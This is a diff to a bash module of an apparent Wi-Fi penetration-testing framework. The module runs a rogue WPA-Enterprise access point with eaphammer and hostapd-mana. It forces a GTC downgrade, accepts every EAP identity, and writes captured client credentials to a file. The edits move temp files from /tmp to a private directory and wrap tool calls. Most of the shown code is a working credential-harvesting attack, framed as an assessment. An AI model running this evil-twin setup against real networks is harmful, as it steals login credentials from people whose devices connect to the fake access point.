@@ -1,4 +1,15 @@
 #!/usr/bin/env bash
+# MODULE_META
+# NAME="WPA-Enterprise / EAP Attack"
+# CATEGORY="D"
+# DEPS="A1"
+# CRITICAL="yes"
+# TOOLS="eaphammer,hostapd-mana"
+# DESC="Deploy rogue RADIUS to capture EAP credentials and test cert validation"
+# REQS="monitor_iface,target_ssid,target_bssid,target_channel"
+# PCAP="yes"
+# DECODE="wifi_mgmt"
+
 #===============================================================================
 #  modules/d5_eap_attack.sh
 #  D5: WPA-Enterprise / EAP Credential Harvesting
@@ -98,7 +109,7 @@ run_d5() {
     if has_tc_results "A1"; then
         local a1_data
         a1_data=$(load_tc_result "A1")
-        target_encryption=$(echo "$a1_data" | ${TOOL_PATHS[jq]} -r \
+        target_encryption=$(echo "$a1_data" | run_tool jq -r \
             --arg bssid "$GUEST_BSSID" \
             '[.networks[] | select(.bssid == $bssid)] | .[0].encryption // ""')
     fi
@@ -212,6 +223,7 @@ run_d5() {
 
     # Parse EAP identities from capture
     if [[ "$has_tshark" == "true" && -f "$eap_pcap" ]]; then
+        ensure_user_ownership "$eap_pcap"
         {
             echo "============================================================"
             echo "  EAP Method Analysis"
@@ -221,7 +233,7 @@ run_d5() {
 
         # Extract EAP Identity responses
         local eap_identities
-        local eap_identities=$(${TOOL_PATHS[tshark]} -r "$eap_pcap" \
+        local eap_identities=$(run_as_user tshark -r "$eap_pcap" \
             -Y "eap.type == 1 && eap.code == 2" \
             -T fields \
             -e eap.identity \
@@ -245,7 +257,7 @@ run_d5() {
 
         # Detect EAP type
         local eap_types
-        local eap_types=$(${TOOL_PATHS[tshark]} -r "$eap_pcap" \
+        local eap_types=$(run_as_user tshark -r "$eap_pcap" \
             -Y "eap" \
             -T fields \
             -e eap.type \
@@ -320,14 +332,14 @@ run_d5() {
         echo "=== ${TOOL_PATHS[eaphammer]} Attack ===" >> "$findings_file"
 
         # Generate self-signed cert if needed
-        local cert_dir="/tmp/d5_certs"
+        local cert_dir="$TMP_DIR/d5_certs"
         mkdir -p "$cert_dir"
 
         # ${TOOL_PATHS[eaphammer]} handles cert generation internally
         # Try GTC downgrade first (captures cleartext creds)
         log_cmd "${TOOL_PATHS[eaphammer]} -i ${ap_iface} --essid '${EAP_ROGUE_SSID}' --channel ${GUEST_CHANNEL:-6} --auth wpa-eap --creds --negotiate balanced"
 
-        local eaphammer_log="/tmp/d5_eaphammer.log"
+        local eaphammer_log="$TMP_DIR/d5_eaphammer.log"
 
         timeout 120 ${TOOL_PATHS[eaphammer]} \
             -i "$ap_iface" \
@@ -386,10 +398,10 @@ run_d5() {
         echo "=== ${TOOL_PATHS[hostapd]}-mana Attack ===" >> "$findings_file"
 
         # Create ${TOOL_PATHS[hostapd]}-mana config
-        local mana_conf="/tmp/d5_mana.conf"
+        local mana_conf="$TMP_DIR/d5_mana.conf"
 
         # Generate a self-signed certificate for RADIUS
-        local cert_dir="/tmp/d5_certs"
+        local cert_dir="$TMP_DIR/d5_certs"
         mkdir -p "$cert_dir"
 
         # Generate minimal cert with openssl
@@ -412,7 +424,7 @@ ieee8021x=1
 
 # EAP server
 eap_server=1
-eap_user_file=/tmp/d5_eap_users
+eap_user_file=$TMP_DIR/d5_eap_users
 ca_cert=${cert_dir}/server.pem
 server_cert=${cert_dir}/server.pem
 private_key=${cert_dir}/server.key
@@ -420,18 +432,18 @@ private_key=${cert_dir}/server.key
 # MANA-specific: Accept all EAP identities
 mana_wpe=1
 mana_eapsuccess=1
-mana_credout=/tmp/d5_mana_creds.txt
+mana_credout=$TMP_DIR/d5_mana_creds.txt
 MANA_EOF
 
         # Create EAP user file
-        cat > /tmp/d5_eap_users <<'EAP_EOF'
+        cat > $TMP_DIR/d5_eap_users <<'EAP_EOF'
 * PEAP,TTLS,TLS,GTC,MSCHAPV2
 "t" TTLS-MSCHAPV2 "t" [2]
 EAP_EOF
 
         log_cmd "${TOOL_PATHS[hostapd]}-mana ${mana_conf}"
 
-        timeout 120 ${TOOL_PATHS[hostapd]}-mana "$mana_conf" > /tmp/d5_mana.log 2>&1 &
+        timeout 120 ${TOOL_PATHS[hostapd]}-mana "$mana_conf" > $TMP_DIR/d5_mana.log 2>&1 &
         local mana_pid=$!
         register_cleanup "kill -TERM $mana_pid 2>/dev/null || true; sleep 0.5; kill -9 $mana_pid 2>/dev/null || true; wait $mana_pid 2>/dev/null || true"
 
@@ -441,18 +453,18 @@ EAP_EOF
 
         
         # Check for captured credentials
-        if [[ -f /tmp/d5_mana_creds.txt && -s /tmp/d5_mana_creds.txt ]]; then
-            local credentials_captured=$(wc -l < /tmp/d5_mana_creds.txt)
-            cat /tmp/d5_mana_creds.txt >> "$credentials_file"
+        if [[ -f $TMP_DIR/d5_mana_creds.txt && -s $TMP_DIR/d5_mana_creds.txt ]]; then
+            local credentials_captured=$(wc -l < $TMP_DIR/d5_mana_creds.txt)
+            cat $TMP_DIR/d5_mana_creds.txt >> "$credentials_file"
             log_result "CRITICAL" "★ ${credentials_captured} credential(s) captured via ${TOOL_PATHS[hostapd]}-mana!"
             echo "CRITICAL: Credentials captured via ${TOOL_PATHS[hostapd]}-mana" >> "$findings_file"
             local cert_validation_bypass="true"
         fi
 
-        if [[ -f /tmp/d5_mana.log ]]; then
+        if [[ -f $TMP_DIR/d5_mana.log ]]; then
             # Extract identities from mana log
             local mana_ids
-            local mana_ids=$(grep -i "identity" /tmp/d5_mana.log | grep -oP "identity='[^']+'" | sort -u || true)
+            local mana_ids=$(grep -i "identity" $TMP_DIR/d5_mana.log | grep -oP "identity='[^']+'" | sort -u || true)
             if [[ -n "$mana_ids" ]]; then
                 local new_ids
                 local new_ids=$(echo "$mana_ids" | wc -l)
@@ -462,7 +474,7 @@ EAP_EOF
         fi
 
         # Cleanup
-        rm -rf "$cert_dir" /tmp/d5_mana* /tmp/d5_eap_users
+        rm -rf "$cert_dir" $TMP_DIR/d5_mana* $TMP_DIR/d5_eap_users
 
     else
         log_info "No rogue RADIUS tool available — passive analysis only"
@@ -475,9 +487,9 @@ EAP_EOF
     update_tc_progress 5 $total_steps "Cleanup"
 
     # Restore AP interface
-    ${TOOL_PATHS[ip]} link set "$ap_iface" down 2>/dev/null || true
+    run_tool ip link set "$ap_iface" down 2>/dev/null || true
     iw dev "$ap_iface" set type managed 2>/dev/null || true
-    ${TOOL_PATHS[ip]} link set "$ap_iface" up 2>/dev/null || true
+    run_tool ip link set "$ap_iface" up 2>/dev/null || true
 
     #--- Step 6: Analyze EAP security posture ---
     log_step 6 $total_steps "Analyzing EAP security posture"
@@ -521,7 +533,7 @@ EAP_EOF
     if [[ "$has_tshark" == "true" && -f "$eap_pcap" ]]; then
         # Try to extract server certificate
         local server_cert
-        local server_cert=$(${TOOL_PATHS[tshark]} -r "$eap_pcap" \
+        local server_cert=$(run_as_user tshark -r "$eap_pcap" \
             -Y "tls.handshake.certificate" \
             -T fields \
             -e x509sat.utf8String \
@@ -583,7 +595,7 @@ EAP_EOF
     evidence_register_file "d5_handshakes.pcap"
     evidence_register_file "d5_findings.txt"
 
-    local result_json=$(${TOOL_PATHS[jq]} -n \
+    local result_json=$(run_tool jq -n \
         --arg status "$result_status" \
         --arg summary "$result_summary" \
         --arg details "EAP type: ${eap_type_detected:-unknown}, Identities: ${identities_captured}, Creds: ${credentials_captured}, Cert bypass: ${cert_validation_bypass}, Downgrade: ${eap_downgrade_possible}" \
@@ -605,7 +617,7 @@ EAP_EOF
             eap_downgrade_possible: ($eap_downgrade_possible == "true"),
                     }')
 
-    save_tc_result "D5" "$result_json"
+    save_tc_result "D5" "$result_json" "has_tool_output:1,clean_run:1"
 
     # Display summary
     echo ""
